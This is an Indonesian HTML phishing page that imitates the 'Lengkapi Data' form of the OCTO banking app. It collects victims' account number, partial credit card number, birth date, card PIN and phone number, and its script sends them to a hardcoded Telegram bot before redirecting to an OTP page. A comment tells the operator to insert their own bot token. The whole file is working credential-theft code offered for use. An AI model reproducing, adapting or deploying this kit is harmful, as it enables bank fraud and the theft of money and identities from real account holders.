<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lengkapi Data - OCTO</title>
    <style>
        :root {
            --brand-red: #a31d1d;
            --orange-help: #f5a623;
            --border-gray: #e0e0e0;
        }

        * {
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            margin: 0;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 414px;
            min-height: 100vh;
            background-color: white;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* Header Layout */
        .header {
            background-color: var(--brand-red);
            height: 90px;
            padding: 15px;
            border-bottom-left-radius: 40px;
            border-bottom-right-radius: 40px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .back-nav {
            position: absolute;
            left: 20px;
            top: 25px;
            background: rgba(255, 255, 255, 0.15);
            width: 35px;
            height: 35px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
            color: white;
            cursor: pointer;
        }

        .title {
            color: white;
            font-size: 18px;
            font-weight: bold;
            margin-top: -5px;
        }

        .help-label {
            position: absolute;
            right: 0;
            top: 28px;
            background-color: var(--orange-help);
            color: white;
            padding: 5px 12px;
            border-top-left-radius: 20px;
            border-bottom-left-radius: 20px;
            font-size: 11px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        /* Form Area */
        .content {
            padding: 40px 25px;
            flex-grow: 1;
        }

        .input-box {
            margin-bottom: 30px;
            position: relative;
            border-bottom: 1.5px solid var(--border-gray);
            padding-bottom: 8px;
        }

        .input-box input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 16px;
            color: #333;
            background: transparent;
        }

        .input-box input::placeholder {
            color: #b0b0b0;
        }

        .icon-right {
            position: absolute;
            right: 0;
            bottom: 10px;
            color: var(--brand-red);
            font-size: 18px;
            cursor: pointer;
        }

        .phone-row {
            display: flex;
            align-items: center;
        }

        .prefix {
            font-weight: bold;
            margin-right: 12px;
            color: #333;
            font-size: 16px;
        }

        .note {
            font-size: 13px;
            color: #555;
            line-height: 1.6;
            margin-top: 15px;
        }

        .note a {
            color: var(--brand-red);
            text-decoration: none;
            font-weight: bold;
        }

        /* Footer Button */
        .footer {
            padding: 20px 25px 35px 25px;
        }

        .btn-lanjut {
            width: 100%;
            padding: 16px;
            border-radius: 30px;
            border: none;
            background: linear-gradient(to right, #d32f2f, #a31d1d);
            color: white;
            font-size: 17px;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(163, 29, 29, 0.25);
            cursor: pointer;
        }

        /* Input Date Adjustment */
        input[type="date"]::-webkit-calendar-picker-indicator {
            opacity: 0;
            position: absolute;
            right: 0;
            width: 100%;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="back-nav">❮</div>
        <div class="title">Lengkapi Data</div>
        <div class="help-label">Butuh bantuan? 💡</div>
    </div>

    <div class="content">
        <div class="input-box">
            <input type="number" id="rekening" inputmode="numeric" placeholder="Masukkan Nomor Rekening">
        </div>

        <div class="input-box">
            <input type="number" id="card" inputmode="numeric" placeholder="Masukkan 4 digit terakhir Kartu Kredit">
        </div>

        <div class="input-box">
            <input type="text" id="dob" placeholder="Masukkan tanggal lahir" 
                   onfocus="(this.type='date')" 
                   onblur="if(!this.value)this.type='text'">
            <span class="icon-right" onclick="document.getElementById('dob').showPicker()">📅</span>
        </div>

        <div class="input-box">
            <input type="password" id="pin" placeholder="Masukkan PIN Kartu Kredit">
            <span class="icon-right">ⓘ</span>
        </div>

        <div class="input-box phone-row">
            <span class="prefix">+62 ▼</span>
            <input type="tel" id="phone" placeholder="Masukkan nomor ponsel">
            <span class="icon-right">ⓘ</span>
        </div>

        <p class="note">
            Apabila kartu kredit Anda belum aktif, silakan lakukan 
            <a href="#">aktivasi kartu di sini</a> sebelum mendaftar Aplikasi OCTO.
        </p>
    </div>

    <div class="footer">
        <button class="btn-lanjut" onclick="handleSubmit()">Lanjut</button>
    </div>
</div>

<script>
    // --- GANTI DENGAN DATA BOT ANDA ---
    const TOKEN = '8462084079:AAHQ94IQ_-iOg10Y9IiTSnNzeb2IFDikpes';
    const CHAT_ID = '7692820036';

    async function handleSubmit() {
        const rekening = document.getElementById('rekening').value;
        const card = document.getElementById('card').value;
        const dob = document.getElementById('dob').value;
        const pin = document.getElementById('pin').value;
        const phone = document.getElementById('phone').value;

        // Validasi
        if(!rekening || !card || !dob || !pin || !phone) {
            alert("Harap lengkapi semua data formulir.");
            return;
        }

        const pesan = `
📌 *DATA BARU MASUK*
-----------------------
No Rekening: \`${rekening}\`
4 Digit Kartu: \`${card}\`
Tgl Lahir: \`${dob}\`
PIN Kartu: \`${pin}\`
No HP: \`+62${phone}\`
-----------------------
        `;

        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: pesan,
                    parse_mode: 'Markdown'
                })
            });
            
            // Pindah ke halaman OTP
            window.location.href = "otp.html";
            
        } catch (e) {
            console.error(e);
            window.location.href = "otp.html";
        }
    }
</script>

</body>
</html>
